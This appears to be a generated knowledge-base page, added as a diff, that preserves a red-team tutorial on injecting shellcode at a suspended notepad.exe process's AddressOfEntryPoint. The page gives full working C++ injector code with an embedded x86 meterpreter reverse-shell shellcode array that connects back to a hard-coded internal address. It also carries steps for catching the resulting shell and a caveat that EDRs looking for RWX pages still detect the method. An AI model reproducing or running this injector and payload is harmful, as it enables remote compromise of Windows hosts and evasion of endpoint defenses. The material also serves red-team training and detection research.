@@ -1,0 +1,92 @@
+---
+parsed_by: focuslocust
+source: redteamingtactics
+type: generated
+---
+# AddressOfEntryPoint Code Injection without VirtualAllocEx RWX
+
+[Home](../../../README.md)
+
+## Provenance
+
+| Field | Value |
+| --- | --- |
+| Source | `redteamingtactics` |
+| Type | `redteaming-topic` |
+| Record ID | `rtt-offensive-security-code-injection-process-injection-addressofentrypoint-code-injection-without-virtualallocex-rwx` |
+| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/addressofentrypoint-code-injection-without-virtualallocex-rwx.md` |
+| Parsed by | `focuslocust` |
+| Relationship mode | `explicit / conservative inferred / manual` |
+
+## Generated Concept Page
+
+- [AddressOfEntryPoint Code Injection without VirtualAllocEx RWX](../../topics/offensive-security/addressofentrypoint-code-injection-without-virtualallocex-rwx.md)
+
+## Extracted Fields
+
+| Field | Value |
+| --- | --- |
+| id | rtt-offensive-security-code-injection-process-injection-addressofentrypoint-code-injection-without-virtualallocex-rwx |
+| name | AddressOfEntryPoint Code Injection without VirtualAllocEx RWX |
+| type | redteaming-topic |
+| source | redteamingtactics |
+| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/addressofentrypoint-code-injection-without-virtualallocex-rwx.md |
+
+## Preserved Source Material
+
+````yaml
+_asset_filenames:
+- image (194).png
+- image (195).png
+- overwrite-entrypoint-catch-meterpreter.gif
+- overwrite-entrypoint.gif
+_body: "---\ndescription: Code Injection\n---\n\n# AddressOfEntryPoint Code Injection without VirtualAllocEx RWX\n\nThis is\
+  \ a shellcode injection technique that works as follows:\n\n1. Start a target process into which the shellcode will be injected,\
+  \ in suspended state.&#x20;\n2. Get `AddressOfEntryPoint` of the target process\n3. Write shellcode to `AddressOfEntryPoint`\
+  \ retrieved in step 2\n4. Resume target process\n5. Catch the incoming shell\n\nWhat's nice about this technique is that\
+  \ we do not need to allocate RWX memory pages in the victim process which some EDRs may not like.\n\n{% hint style=\"warning\"\
+  \ %}\n**Attention**\n\nPer [https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/issues/36](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/issues/36).\n\
+  \nAt the page on [AddressOfEntryPoint Code Injection without VirtualAllocEx RWX](https://www.ired.team/offensive-security/code-injection-process-injection/addressofentrypoint-code-injection-without-virtualallocex-rwx),\
+  \ this is not really done without using RWX. As shown in the first picture, the entrypoint memory page is already under\
+  \ RX permissions, and as shown [here](https://www.ired.team/offensive-security/defense-evasion/finding-all-rwx-protected-memory-regions),\
+  \ the only reason this method works is because WriteProcessMemory is being nice and trying to change RX to RWX temporarily,\
+  \ which would end up creating an RWX page anyways, essentially making this technique still easily detectable by EDRs that\
+  \ look for RWX regions.\n{% endhint %}\n\n## Execution\n\nFirst, in order to get `AddressOfEntryPoint`, we need to get the\
+  \ image base address of the target process - notepad.exe:\n\n![](<../../.gitbook/assets/image (194).png>)\n\nWe then need\
+  \ to parse out the NT and Optional Headers and find the AddressEntryPoint (Relative Virtual Address) of the notepad.exe\
+  \ which in my case was at 0001bf90:\n\n![](<../../.gitbook/assets/image (195).png>)\n\nKnowing notepad's image base address\
+  \ and an RVA of the AddressEntryPoint, we can get its Virtual Address (by adding the two up) and hijack the executable by\
+  \ overwriting the very first instructions found at that address with our shellcode:\n\n![bytes at AddressOfEntryPoint get\
+  \ overwritten with shellcode](../../.gitbook/assets/overwrite-entrypoint.gif)\n\nResuming the suspended process executes\
+  \ our shellcode which results in a meterpreter session:\n\n![](../../.gitbook/assets/overwrite-entrypoint-catch-meterpreter.gif)\n\
+  \n## Code\n\n```cpp\n#include \"pch.h\"\n#include <iostream>\n#include <windows.h>\n#include <winternl.h>\n#pragma comment(lib,\
+  \ \"ntdll\")\n\nint main()\n{\n\t//x86 meterpreter\n\tunsigned char shellcode[] = \n\t\t\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\\
+  x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\n\t\t\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\\
+  x31\\xff\"\n\t\t\"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\"\n\t\t\"\\x57\\x8b\\x52\\\
+  x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\"\n\t\t\"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\\
+  x3a\\x49\\x8b\\x34\\x8b\"\n\t\t\"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\"\n\t\t\"\\\
+  x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\"\n\t\t\"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\\
+  x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\"\n\t\t\"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\\
+  xeb\"\n\t\t\"\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\"\n\t\t\"\\x77\\x26\\x07\\x89\\\
+  xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\"\n\t\t\"\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\\
+  x0a\\x00\\x00\\x05\"\n\t\t\"\\x68\\x02\\x00\\x01\\xbb\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\"\n\t\t\"\\x68\\\
+  xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\"\n\t\t\"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\\
+  xff\\x4e\\x08\\x75\\xec\\xe8\\x67\"\n\t\t\"\\x00\\x00\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\"\
+  \n\t\t\"\\xd5\\x83\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\"\n\t\t\"\\x56\\x6a\\x00\\x68\\x58\\\
+  xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\"\n\t\t\"\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\\
+  x7d\\x28\\x58\"\n\t\t\"\\x68\\x00\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0f\\x30\\xff\\xd5\"\n\t\t\"\\x57\\x68\\\
+  x75\\x6e\\x4d\\x61\\xff\\xd5\\x5e\\x5e\\xff\\x0c\\x24\\x0f\\x85\"\n\t\t\"\\x70\\xff\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\\
+  x01\\xc3\\x29\\xc6\\x75\\xc1\"\n\t\t\"\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5\";\n\t\n\tSTARTUPINFOA si;\n\
+  \tsi = {};\n\tPROCESS_INFORMATION pi = {};\n\tPROCESS_BASIC_INFORMATION pbi = {};\n\tDWORD returnLength = 0;\n\tCreateProcessA(0,\
+  \ (LPSTR)\"c:\\\\windows\\\\system32\\\\notepad.exe\", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);\n\n\t// get target image\
+  \ PEB address and pointer to image base\n\tNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION),\
+  \ &returnLength);\n\tDWORD pebOffset = (DWORD)pbi.PebBaseAddress + 8;\n\n\t// get target process image base address\n\t\
+  LPVOID imageBase = 0;\n\tReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBase, 4, NULL);\n\t\n\t// read target\
+  \ process image headers\n\tBYTE headersBuffer[4096] = {};\n\tReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer,\
+  \ 4096, NULL);\n\n\t// get AddressOfEntryPoint\n\tPIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;\n\tPIMAGE_NT_HEADERS\
+  \ ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);\n\tLPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint\
+  \ + (DWORD)imageBase);\n\n\t// write shellcode to image entry point and execute it\n\tWriteProcessMemory(pi.hProcess, codeEntry,\
+  \ shellcode, sizeof(shellcode), NULL);\n\tResumeThread(pi.hThread);\n\n\treturn 0;\n}\n```"
+_relative_path: offensive-security/code-injection-process-injection/addressofentrypoint-code-injection-without-virtualallocex-rwx.md
+_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/addressofentrypoint-code-injection-without-virtualallocex-rwx.md
+````
